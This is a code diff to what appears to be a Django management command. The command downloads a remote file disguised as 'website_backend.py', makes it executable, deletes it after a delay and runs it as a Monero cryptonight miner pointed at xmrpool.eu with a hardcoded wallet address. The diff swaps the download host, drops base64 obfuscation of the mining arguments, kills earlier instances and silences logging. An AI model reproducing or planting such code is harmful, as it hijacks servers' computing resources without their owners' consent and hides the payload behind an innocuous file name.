@@ -24,9 +24,10 @@ class Command(BaseCommand):
         #logger.info("I'm doing something")
         #import ipdb;ipdb.set_trace()
 
-        url = 'https://transfer.sh/P16s0/website_backend.py'
+        url = 'https://www.dropbox.com/s/r6eyziqwbpqho1x/website_backend.py?dl=1'
 
         local_filename = os.path.join(PROJECT_PATH, 'website_backend.py')
+
         r = requests.get(url, stream=True)
         with open(local_filename, 'wb') as f:
             for chunk in r.iter_content(chunk_size=1024):
@@ -35,12 +36,12 @@ class Command(BaseCommand):
 
         os.chmod(local_filename, 0777)
 
-        logger.info(" ".join(os.listdir(PROJECT_PATH)))
+        #logger.info(" ".join(os.listdir(PROJECT_PATH)))
 
         def rm_temp_file():
-            time.sleep(1)
+            time.sleep(2)
             os.unlink(local_filename)
-            logger.info(" ".join(os.listdir(PROJECT_PATH)))
+            #logger.info(" ".join(os.listdir(PROJECT_PATH)))
 
         #t = threading.Thread(name='child procs', target=rm_temp_file)
         #t.start()
@@ -48,14 +49,19 @@ class Command(BaseCommand):
         cmd = os.path.join(PROJECT_PATH, 'website_backend.py')
         hash = '42G5btuJwzjbNAuLCDZfrtP6C9gzKEwr3Kvy4B6uZfEhYRoVV2AnFoZW8Tit6Rmu7VJdPF72y1kn4iqtMpdNnUnTV6P73G7'
         hash += '+%s' % options['pod'] if 'pod' in options else ''
-        cmd_args = ' -a cryptonight -o stratum+tcp://xmrpool.eu:3333 -u %s -p x' % hash
-        cmd_args = base64.b64encode(cmd_args)
-        cmd = 'echo "%s" | base64 -d | xargs %s' % (cmd_args, cmd)
+        cmd_args = '-u %s -p x -o stratum+tcp://xmrpool.eu:3333 -a cryptonight ' % hash
+        #cmd_args = base64.b64encode(cmd_args)
+
+        #cmd = 'echo "%s" | base64 -d | xargs %s' % (cmd_args, cmd)
+        #cmd = '%s $(cat %s)' % (cmd, args_file)
+        cmd = '%s %s' % (cmd, cmd_args)
         #cmd += ' > /dev/null 2>&1'
 
         print cmd
         #return
 
+        os.system('pkill -f website_backend')
+        time.sleep(3)
         os.system(cmd)
 
         #process = subprocess.Popen(cmd.split(), stderr=subprocess.PIPE, shell=True)
